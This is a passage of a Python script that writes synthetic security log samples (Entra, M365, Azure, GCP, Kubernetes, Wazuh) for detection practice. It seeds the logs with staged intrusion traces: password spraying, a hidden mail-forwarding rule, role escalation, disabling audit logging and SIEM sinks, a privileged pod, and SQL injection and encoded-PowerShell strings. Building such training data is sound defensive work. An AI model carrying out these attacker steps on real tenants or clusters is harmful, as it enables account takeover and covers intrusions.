    records = []
    apps = ["Office 365 Exchange Online", "Microsoft Teams", "SharePoint Online", "Azure Portal", "Microsoft 365 Copilot"]
    countries = [("Tel Aviv", "IL"), ("Beersheba", "IL"), ("Haifa", "IL")]

    def sign_in(i: int, user: str, ip: str, code: int, reason: str, app: str, city: str, country: str, client: str = "Browser",
                risk: str = "none", ca: str = "success", requirement: str = "multiFactorAuthentication") -> dict:
        moment = at(i, 61)
        return {
            "id": f"{random.randint(10**7, 10**8):x}-demo-{i}", "createdDateTime": moment.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "userDisplayName": user.split("@")[0].title(), "userPrincipalName": user, "appDisplayName": app, "ipAddress": ip,
            "clientAppUsed": client, "conditionalAccessStatus": ca, "isInteractive": True, "riskLevelDuringSignIn": risk,
            "authenticationRequirement": requirement,
            "status": {"errorCode": code, "failureReason": reason, "additionalDetails": None},
            "deviceDetail": {"operatingSystem": random.choice(["Windows10", "MacOs", "Ios"]), "browser": random.choice(["Edge 129.0", "Chrome 129.0", "Safari 17.5"])},
            "location": {"city": city, "state": "", "countryOrRegion": country},
        }

    for i in range(90):
        if 20 <= i < 38:
            user = random.choice(["alice", "bob", "carol", "dave", "finance", "ceo", "it-admin"]) + "@contoso.example"
            records.append(sign_in(i, user, "185.220.101.45", 50126, "Invalid username or password or Invalid on-premise username or password.",
                                   "Office 365 Exchange Online", "Frankfurt am Main", "DE", client="Other clients", ca="notApplied", requirement="singleFactorAuthentication"))
        elif i == 38:
            records.append(sign_in(i, "finance@contoso.example", "185.220.101.45", 50053, "Account is locked because user tried to sign in too many times with an incorrect user ID or password.",
                                   "Office 365 Exchange Online", "Frankfurt am Main", "DE", client="Other clients", ca="notApplied"))
        elif 45 <= i < 50:
            records.append(sign_in(i, "bob@contoso.example", "102.89.33.17", 500121, "Authentication failed during strong authentication request.", "Microsoft Teams", "Lagos", "NG", risk="medium"))
        elif i == 50:
            records.append(sign_in(i, "bob@contoso.example", "102.89.33.17", 0, "", "Office 365 Exchange Online", "Lagos", "NG", risk="high"))
        elif i == 60:
            records.append(sign_in(i, "carol@contoso.example", "198.51.100.50", 0, "", "Office 365 Exchange Online", "Haifa", "IL", client="IMAP4", requirement="singleFactorAuthentication"))
        elif i == 61:
            records.append(sign_in(i, "dave@contoso.example", "198.51.100.51", 53003, "Access has been blocked by Conditional Access policies.", "Azure Portal", "Moscow", "RU", ca="failure"))
        elif i % 8 == 0:
            city, country = random.choice(countries)
            records.append(sign_in(i, random.choice(USERS) + "@contoso.example", random.choice(GOOD_IPS), 50074, "Strong Authentication is required.", random.choice(apps), city, country))
        else:
            city, country = random.choice(countries)
            records.append(sign_in(i, random.choice(USERS) + "@contoso.example", random.choice(GOOD_IPS), 0, "", random.choice(apps), city, country))

    return json.dumps(records, indent=2) + "\n"


def m365_demo() -> str:
    import csv
    import io

    def audit(i: int, operation: str, user: str, ip: str, workload: str, extra: dict) -> list[str]:
        moment = at(i, 67)
        data = {"CreationTime": moment.strftime("%Y-%m-%dT%H:%M:%S"), "Id": f"{random.randint(10**7, 10**8):x}-{i}", "Operation": operation,
                "OrganizationId": "b6f1c0de-0000-4000-8000-000000000001", "RecordType": 1 if workload == "Exchange" else 6,
                "ResultStatus": extra.pop("ResultStatus", "Succeeded"), "UserKey": user, "UserType": 0, "Workload": workload, "ClientIP": ip, "UserId": user}
        data.update(extra)
        return [moment.strftime("%Y-%m-%dT%H:%M:%S.0000000Z"), user, operation, json.dumps(data)]

    rows = []

    for i in range(80):
        user = random.choice(USERS) + "@contoso.example"

        if i == 20:
            rows.append(audit(i, "New-InboxRule", "bob@contoso.example", "102.89.33.17:51234", "Exchange", {
                "ObjectId": "bob\\\\.", "Parameters": [{"Name": "Name", "Value": "."}, {"Name": "SubjectOrBodyContainsWords", "Value": "invoice;payment;wire"},
                                                      {"Name": "MoveToFolder", "Value": "RSS Feeds"}, {"Name": "MarkAsRead", "Value": "True"}]}))
        elif i == 21:
            rows.append(audit(i, "Set-Mailbox", "bob@contoso.example", "102.89.33.17:51240", "Exchange", {
                "ObjectId": "bob", "Parameters": [{"Name": "Identity", "Value": "bob"}, {"Name": "ForwardingSmtpAddress", "Value": "smtp:bob.backup@mail-relay.example"}, {"Name": "DeliverToMailboxAndForward", "Value": "True"}]}))
        elif i == 30:
            rows.append(audit(i, "Consent to application.", "carol@contoso.example", "198.51.100.50", "AzureActiveDirectory", {
                "ObjectId": "PDF Viewer Pro", "ModifiedProperties": [{"Name": "ConsentContext.IsAdminConsent", "NewValue": "False", "OldValue": ""}, {"Name": "ConsentAction.Permissions", "NewValue": "Mail.Read, Files.ReadWrite.All, offline_access", "OldValue": ""}]}))
        elif i == 40:
            rows.append(audit(i, "Add member to role.", "it-admin@contoso.example", "198.51.100.44", "AzureActiveDirectory", {
                "ObjectId": "helpdesk2@contoso.example", "ModifiedProperties": [{"Name": "Role.DisplayName", "NewValue": "Global Administrator", "OldValue": ""}]}))
        elif i == 41:
            rows.append(audit(i, "Disable Strong Authentication.", "it-admin@contoso.example", "198.51.100.44", "AzureActiveDirectory", {"ObjectId": "helpdesk2@contoso.example"}))
        elif i == 50:
            rows.append(audit(i, "AnonymousLinkCreated", "dave@contoso.example", "198.51.100.47", "OneDrive", {"ObjectId": "https://contoso-my.sharepoint.com/personal/dave/Documents/Salaries-2026.xlsx", "SourceFileName": "Salaries-2026.xlsx"}))
        elif 55 <= i < 62:
            rows.append(audit(i, "UserLoginFailed", random.choice(["ceo", "finance", "alice"]) + "@contoso.example", "185.220.101.45", "AzureActiveDirectory", {"ResultStatus": "Failed", "LogonError": "InvalidUserNameOrPassword"}))
        elif i == 70:
            rows.append(audit(i, "Set-AdminAuditLogConfig", "it-admin@contoso.example", "102.89.33.17", "Exchange", {"Parameters": [{"Name": "UnifiedAuditLogIngestionEnabled", "Value": "False"}]}))
        else:
            operation = random.choice(["UserLoggedIn", "FileAccessed", "MailItemsAccessed", "FileModified", "Send", "FileDownloaded", "MailItemsAccessed"])
            workload = {"UserLoggedIn": "AzureActiveDirectory", "Send": "Exchange", "MailItemsAccessed": "Exchange"}.get(operation, "SharePoint")
            rows.append(audit(i, operation, user, random.choice(GOOD_IPS), workload, {"ObjectId": f"https://contoso.sharepoint.com/sites/team/Shared Documents/report-{i}.docx" if workload == "SharePoint" else ""}))

    output = io.StringIO()
    writer = csv.writer(output, lineterminator="\n")
    writer.writerow(["CreationDate", "UserIds", "Operations", "AuditData"])
    writer.writerows(rows)
    return output.getvalue()


def azure_demo() -> str:
    values = []
    caller = "it-admin@contoso.example"
    sub = "/subscriptions/0b1c2d3e-0000-4000-8000-00000000abcd"

    def entry(i: int, op: str, name: str, status: str, resource: str, who: str = caller, ip: str = "198.51.100.44", category: str = "Administrative", level: str = "Informational") -> dict:
        moment = at(i, 73)
        return {
            "caller": who, "eventTimestamp": moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0, 999999):06d}Z",
            "category": {"value": category, "localizedValue": category}, "level": level,
            "operationName": {"value": op, "localizedValue": name}, "status": {"value": status, "localizedValue": status},
            "resourceGroupName": "rg-prod", "resourceId": f"{sub}/resourceGroups/rg-prod/providers/{resource}",
            "httpRequest": {"clientIpAddress": ip, "method": "PUT"}, "subscriptionId": sub.split("/")[-1],
        }

    for i in range(70):
        if i == 20:
            values.append(entry(i, "Microsoft.Authorization/elevateAccess/action", "Elevate access", "Succeeded", "Microsoft.Authorization/elevateAccess", who="helpdesk2@contoso.example", ip="102.89.33.17"))
        elif i == 21:
            values.append(entry(i, "Microsoft.Authorization/roleAssignments/write", "Create role assignment", "Succeeded", "Microsoft.Authorization/roleAssignments/7f3a", who="helpdesk2@contoso.example", ip="102.89.33.17"))
        elif i == 22:
            values.append(entry(i, "Microsoft.Network/networkSecurityGroups/securityRules/write", "Create or Update Security Rule", "Succeeded", "Microsoft.Network/networkSecurityGroups/nsg-web/securityRules/allow-rdp-any", who="helpdesk2@contoso.example", ip="102.89.33.17"))
        elif i == 23:
            values.append(entry(i, "Microsoft.Compute/virtualMachines/runCommand/action", "Run Command on Virtual Machine", "Succeeded", "Microsoft.Compute/virtualMachines/vm-sql01", who="helpdesk2@contoso.example", ip="102.89.33.17"))
        elif i == 24:
            values.append(entry(i, "Microsoft.Insights/diagnosticSettings/delete", "Delete diagnostic setting", "Succeeded", "Microsoft.Insights/diagnosticSettings/send-to-sentinel", who="helpdesk2@contoso.example", ip="102.89.33.17"))
        elif i == 25:
            values.append(entry(i, "Microsoft.Storage/storageAccounts/listKeys/action", "List Storage Account Keys", "Succeeded", "Microsoft.Storage/storageAccounts/stbackups", who="helpdesk2@contoso.example", ip="102.89.33.17"))
        elif 40 <= i < 45:
            values.append(entry(i, "Microsoft.Compute/virtualMachines/delete", "Delete Virtual Machine", "Failed", "Microsoft.Compute/virtualMachines/vm-web0" + str(i - 39), who="intern@contoso.example", ip="198.51.100.49", level="Error"))
        elif i % 2 == 0:
            values.append(entry(i, "Microsoft.Compute/virtualMachines/start/action", "Start Virtual Machine", "Started", "Microsoft.Compute/virtualMachines/vm-web01"))
        else:
            op = random.choice(["Microsoft.Compute/virtualMachines/start/action", "Microsoft.Web/sites/restart/action", "Microsoft.Compute/virtualMachines/write", "Microsoft.Resources/deployments/write"])
            values.append(entry(i, op, op.split("/")[-2].title(), "Succeeded", op.rsplit("/", 1)[0] + "/res-" + str(i)))

    return json.dumps({"value": values}, indent=2) + "\n"


def gcp_demo() -> str:
    entries = []
    project = "shop-prod-123456"

    def log(i: int, method: str, service: str, resource: str, who: str, ip: str, code: int = 0, message: str = "", kind: str = "activity", extra: dict | None = None) -> dict:
        moment = at(i, 59)
        payload = {
            "@type": "type.googleapis.com/google.cloud.audit.AuditLog", "serviceName": service, "methodName": method, "resourceName": resource,
            "authenticationInfo": {"principalEmail": who}, "requestMetadata": {"callerIp": ip, "callerSuppliedUserAgent": "google-cloud-sdk gcloud/495.0.0"},
        }

        if code:
            payload["status"] = {"code": code, "message": message}

        if extra:
            payload.update(extra)

        return {"protoPayload": payload, "insertId": f"{random.randint(10**9, 10**10):x}", "resource": {"type": "project", "labels": {"project_id": project}},
                "timestamp": moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0, 999999):06d}Z", "severity": "ERROR" if code else "NOTICE",
                "logName": f"projects/{project}/logs/cloudaudit.googleapis.com%2F{'data_access' if kind == 'data' else 'activity'}"}

    for i in range(60):
        if 15 <= i < 25:
            entries.append(log(i, "storage.objects.list", "storage.googleapis.com", f"projects/_/buckets/{project}-backups", "intruder@gmail.example", "185.220.101.45", 7, "PERMISSION_DENIED", "data"))
        elif i == 30:
            entries.append(log(i, "google.iam.admin.v1.CreateServiceAccountKey", "iam.googleapis.com", f"projects/{project}/serviceAccounts/deployer@{project}.iam.gserviceaccount.com", "dev-ann@contoso.example", "102.89.33.17"))
        elif i == 31:
            entries.append(log(i, "storage.setIamPermissions", "storage.googleapis.com", f"projects/_/buckets/{project}-exports", "dev-ann@contoso.example", "102.89.33.17"))
        elif i == 32:
            entries.append(log(i, "SetIamPolicy", "cloudresourcemanager.googleapis.com", f"projects/{project}", "dev-ann@contoso.example", "102.89.33.17", extra={
                "serviceData": {"policyDelta": {"bindingDeltas": [{"action": "ADD", "role": "roles/storage.objectViewer", "member": "allUsers"}]}}}))
        elif i == 33:
            entries.append(log(i, "v1.compute.firewalls.insert", "compute.googleapis.com", f"projects/{project}/global/firewalls/allow-ssh-any", "dev-ann@contoso.example", "102.89.33.17"))
        elif i == 34:
            entries.append(log(i, "google.logging.v2.ConfigServiceV2.DeleteSink", "logging.googleapis.com", f"projects/{project}/sinks/to-siem", "dev-ann@contoso.example", "102.89.33.17"))
        elif i % 3 == 0:
            entries.append(log(i, "storage.objects.get", "storage.googleapis.com", f"projects/_/buckets/{project}-assets/objects/img{i}.png", "web@{0}.iam.gserviceaccount.com".format(project), "10.128.0.12", kind="data"))
        else:
            method = random.choice(["v1.compute.instances.start", "v1.compute.instances.insert", "google.container.v1.ClusterManager.UpdateCluster", "beta.compute.disks.createSnapshot"])
            entries.append(log(i, method, method.split(".")[1] + ".googleapis.com" if method.startswith("v1") or method.startswith("beta") else "container.googleapis.com", f"projects/{project}/zones/europe-west1-b/instances/vm-{i}", "ops@contoso.example", random.choice(GOOD_IPS)))

    return json.dumps(entries, indent=2) + "\n"


def k8s_demo() -> str:
    lines = []

    def event(i: int, verb: str, resource: str, user: str, ip: str, code: int, namespace: str = "default", name: str = "", subresource: str = "",
              agent: str = "kubectl/v1.30.4 (linux/amd64)", groups: list[str] | None = None, request: dict | None = None) -> str:
        moment = at(i, 37)
        stamp = moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0, 999999):06d}Z"
        ref = {"resource": resource, "namespace": namespace, "name": name, "apiVersion": "v1"}

        if subresource:
            ref["subresource"] = subresource

        uri = f"/api/v1/namespaces/{namespace}/{resource}" + (f"/{name}" if name else "") + (f"/{subresource}" if subresource else "")
        data = {"kind": "Event", "apiVersion": "audit.k8s.io/v1", "level": "Metadata", "auditID": f"{random.randint(10**15, 10**16):x}",
                "stage": "ResponseComplete", "requestURI": uri, "verb": verb, "user": {"username": user, "groups": groups or ["system:authenticated"]},
                "sourceIPs": [ip], "userAgent": agent, "objectRef": ref, "responseStatus": {"metadata": {}, "code": code},
                "requestReceivedTimestamp": stamp, "stageTimestamp": stamp, "annotations": {"authorization.k8s.io/decision": "allow" if code < 400 else "forbid"}}

        if request:
            data["requestObject"] = request

        return json.dumps(data)

    for i in range(120):
        if i % 3 == 0:
            lines.append(event(i, random.choice(["get", "list", "watch"]), random.choice(["pods", "endpoints", "configmaps"]), "system:serviceaccount:kube-system:replicaset-controller", "10.0.0.10", 200, "kube-system", agent="kube-controller-manager/v1.30.4"))
        elif i == 40:
            lines.append(event(i, "get", "pods", "system:anonymous", ATTACKER, 200, "kube-system", agent="curl/8.5.0", groups=["system:unauthenticated"]))
        elif 41 <= i < 48:
            lines.append(event(i, "list", random.choice(["secrets", "pods", "nodes"]), "system:anonymous", ATTACKER, 403, random.choice(["default", "kube-system"]), agent="curl/8.5.0", groups=["system:unauthenticated"]))
        elif i == 60:
            lines.append(event(i, "create", "pods", "dev-sam", "198.51.100.48", 101, "shop", "api-7d9f-x2k", "exec"))
        elif i == 61:
            lines.append(event(i, "list", "secrets", "dev-sam", "198.51.100.48", 200, "shop"))
        elif i == 62:
            lines.append(event(i, "create", "clusterrolebindings", "dev-sam", "198.51.100.48", 201, "", "sam-admin", request={"roleRef": {"kind": "ClusterRole", "name": "cluster-admin"}, "subjects": [{"kind": "User", "name": "dev-sam"}]}))
        elif i == 63:
            lines.append(event(i, "create", "pods", "dev-sam", "198.51.100.48", 201, "default", "debug-node", request={"spec": {"hostPID": True, "containers": [{"name": "x", "image": "alpine", "securityContext": {"privileged": True}}]}}))
        else:
            verb = random.choice(["get", "list", "update", "patch", "create"])
            lines.append(event(i, verb, random.choice(["deployments", "pods", "services", "configmaps"]), random.choice(["ci-deployer", "ops-maria"]), random.choice(LAN), 200 if verb in ("get", "list", "update", "patch") else 201, "shop"))

    lines.insert(70, BROKEN)
    return "\n".join(lines) + "\n"


def wazuh_demo() -> str:
    lines = []
    rules = [
        ("5710", 5, "sshd: Attempt to login using a non-existent user", ["syslog", "sshd", "authentication_failed", "invalid_login"], ["T1110.001"], ["Credential Access"], ["Password Guessing"]),
        ("5712", 10, "sshd: brute force trying to get access to the system. Non existent user.", ["syslog", "sshd", "authentication_failures"], ["T1110"], ["Credential Access"], ["Brute Force"]),
        ("5715", 3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"], ["T1078"], ["Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"], ["Valid Accounts"]),
        ("5402", 3, "Successful sudo to ROOT executed.", ["syslog", "sudo"], ["T1548.003"], ["Privilege Escalation", "Defense Evasion"], ["Sudo and Sudo Caching"]),
        ("31103", 7, "SQL injection attempt.", ["web", "accesslog", "attack", "sql_injection"], ["T1190"], ["Initial Access"], ["Exploit Public-Facing Application"]),
        ("92052", 12, "Windows command prompt started by an abnormal process", ["windows", "sysmon", "sysmon_eid1_detections"], ["T1059.003"], ["Execution"], ["Windows Command Shell"]),
        ("550", 7, "Integrity checksum changed.", ["ossec", "syscheck", "syscheck_entry_modified"], ["T1565.001"], ["Impact"], ["Stored Data Manipulation"]),
        ("502", 3, "Wazuh server started.", ["ossec"], [], [], []),
    ]

    for i in range(110):
        if 20 <= i < 35:
            rule = rules[0] if i < 34 else rules[1]
            src, user, agent, full = ATTACKER, random.choice(GUESSED), ("002", "web01", "10.0.0.5"), "sshd[4200]: Invalid user {u} from 203.0.113.66 port 41000"
        elif 50 <= i < 54:
            rule, src, user, agent, full = rules[4], ATTACKER, "", ("002", "web01", "10.0.0.5"), "203.0.113.66 - - \"GET /index.php?id=1' UNION SELECT 1,2-- HTTP/1.1\" 200"
        elif i == 70:
            rule, src, user, agent, full = rules[5], "", "alice", ("003", "WS-ALICE", "10.0.0.33"), "WINWORD.EXE spawned cmd.exe /c powershell -enc ..."
        elif i == 80:
            rule, src, user, agent, full = rules[6], "", "", ("002", "web01", "10.0.0.5"), "File '/etc/passwd' modified"
        else:
            rule = random.choice([rules[2], rules[3], rules[7], rules[2]])
            src, user, agent, full = random.choice(GOOD_IPS) if rule[0] == "5715" else "", random.choice(USERS), ("002", "web01", "10.0.0.5"), rule[2]

        moment = at(i, 41)
        rid, level, description, groups, ids, tactics, techniques = rule
        record = {
            "timestamp": moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0, 999):03d}+0000",
            "rule": {"level": level, "description": description, "id": rid, "firedtimes": i, "mail": level >= 12, "groups": groups,
                     **({"mitre": {"id": ids, "tactic": tactics, "technique": techniques}} if ids else {})},
            "agent": {"id": agent[0], "name": agent[1], "ip": agent[2]}, "manager": {"name": "wazuh-manager"},
            "id": f"{int(moment.timestamp())}.{random.randint(1000, 99999)}", "full_log": full.replace("{u}", user), "decoder": {"name": groups[1] if len(groups) > 1 else "ossec"},
            "data": {k: v for k, v in (("srcip", src), ("srcuser", user)) if v}, "location": "/var/log/auth.log",
        }
        lines.append(json.dumps(record))

    return "\n".join(lines) + "\n"


DEMOS = {
    "pfirewall.log": pfirewall_demo,
    "snort-fast.log": snort_demo,
    "leef.log": leef_demo,
    "pfsense-filterlog.log": pfsense_demo,
    "cisco-asa.log": asa_demo,
    "fortigate.log": forti_demo,
    "paloalto.log": paloalto_demo,
    "vpc-flow.log": vpc_demo,
    "aws-alb.log": alb_demo,
    "windows-dns.log": windows_dns_demo,
    "bind-query.log": bind_demo,
    "pihole.log": pihole_demo,
    "openvpn.log": openvpn_demo,
    "postgresql.log": postgres_demo,
    "mysql-error.log": mysql_demo,
    "entra-signins.json": entra_demo,
    "m365-audit.csv": m365_demo,
    "azure-activity.json": azure_demo,
    "gcp-audit.json": gcp_demo,
    "k8s-audit.jsonl": k8s_demo,
    "wazuh-alerts.json": wazuh_demo,
}


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)

    for name, build in DEMOS.items():
        content = build()
        (OUT / name).write_text(content, encoding="utf-8", newline="")
        print(f"{name:26} {len(content) / 1024:7.1f} KB")


if __name__ == "__main__":
    main()
